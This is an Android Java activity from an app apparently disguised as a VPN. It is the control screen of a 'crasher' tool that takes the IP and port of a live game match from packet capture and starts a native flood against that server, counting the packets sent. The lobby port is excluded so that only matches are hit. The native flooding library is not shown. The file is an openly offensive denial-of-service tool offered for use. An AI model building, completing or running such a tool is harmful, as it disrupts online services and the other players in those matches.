package com.creysvpn.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class CrasherActivity extends Activity {

    private Button btnGo;
    private TextView tvStatus;
    private volatile boolean attacking = false;
    private Handler handler = new Handler();

    // Native C++ methods
    private native void startNativeCrash(String ip, int port);
    private native void stopNativeCrash();
    private native int getNativeSent();

    static {
        System.loadLibrary("crasher");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_crasher);

        btnGo = findViewById(R.id.btn_go);
        tvStatus = findViewById(R.id.tv_status);

        btnGo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!attacking) attack(); else stop();
            }
        });
    }

    private void attack() {
        String ip = PcapVpnService.getCurrentIP();
        int port = PcapVpnService.getCurrentPort();

        if (ip.isEmpty() || port == 0) {
            Toast.makeText(this, "Зайди в матч сначала!", Toast.LENGTH_SHORT).show();
            return;
        }

        if (port == 9339) {
            Toast.makeText(this, "Это лобби, нельзя!", Toast.LENGTH_SHORT).show();
            return;
        }

        attacking = true;
        btnGo.setText("STOP");
        tvStatus.setText("ATTACKING\n" + ip + ":" + port);

        startNativeCrash(ip, port);
        startUpdater();
    }

    private void stop() {
        attacking = false;
        stopNativeCrash();
        handler.removeCallbacksAndMessages(null);
        btnGo.setText("GO");
        tvStatus.setText("Остановлено");
    }

    private void startUpdater() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (attacking) {
                    int sent = getNativeSent();
                    tvStatus.setText("ОТПРАВЛЕНО: " + sent);
                    handler.postDelayed(this, 500);
                }
            }
        }, 500);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stop();
    }
}
